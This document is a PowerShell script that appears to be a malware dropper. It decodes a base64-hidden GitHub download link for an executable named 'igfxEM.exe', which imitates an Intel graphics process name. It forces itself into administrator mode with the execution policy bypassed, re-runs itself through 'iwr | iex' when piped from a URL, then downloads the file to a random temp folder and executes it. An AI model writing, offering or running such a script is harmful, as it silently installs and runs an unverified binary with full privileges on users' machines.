$EncodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL0dhZGRldGVjaG5vL25ld3cvcmVsZWFzZXMvZG93bmxvYWQvbmV3L2lnZnhFTS5leGU="
$AppName = "igfxEM.exe"
$ErrorActionPreference = "Stop"

$isAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    if ($MyInvocation.Line -match 'http') {
        $url = ($MyInvocation.Line -match '(https?://\S+)')[1]
        Start-Process powershell.exe -Verb RunAs `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iwr '$url' -UseBasicParsing | iex`""
    } else {
        Start-Process powershell.exe -Verb RunAs `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    }
    exit
}

try {
    $ExeUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedUrl))
    Write-Host "URL Decoded successfully." -ForegroundColor DarkGray
} catch {
    Write-Host "ERROR: Could not decode URL." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit
}

$TempDir = Join-Path $env:TEMP "App_$(Get-Random)"
New-Item -ItemType Directory -Path $TempDir | Out-Null
$ExePath = Join-Path $TempDir $AppName

Write-Host "Downloading..." -ForegroundColor Cyan
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($ExeUrl, $ExePath)

    if (Test-Path $ExePath) {
        Write-Host "Download Complete." -ForegroundColor Green
    } else {
        throw "File was not created after download."
    }
}
catch {
    Write-Host "DOWNLOAD FAILED!" -ForegroundColor Red
    Write-Host "Details: $_" -ForegroundColor Yellow

    if ($_.Exception.Message -like "*404*") {
        Write-Host "Reason: Link is broken or file doesn't exist on GitHub." -ForegroundColor Magenta
    } elseif ($_.Exception.Message -like "*SSL*" -or $_.Exception.Message -like "*Certificate*") {
        Write-Host "Reason: SSL/Certificate issue. Try running in CMD as admin." -ForegroundColor Magenta
    }

    Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
    Read-Host "Press Enter to exit"
    exit
}

Write-Host "Running..." -ForegroundColor Green
try {
    Start-Process -FilePath $ExePath -WorkingDirectory $TempDir -Wait
} catch {
    Write-Host "Failed to start application." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit
}

Write-Host "Done." -ForegroundColor Green
Read-Host "Press Enter to exit"
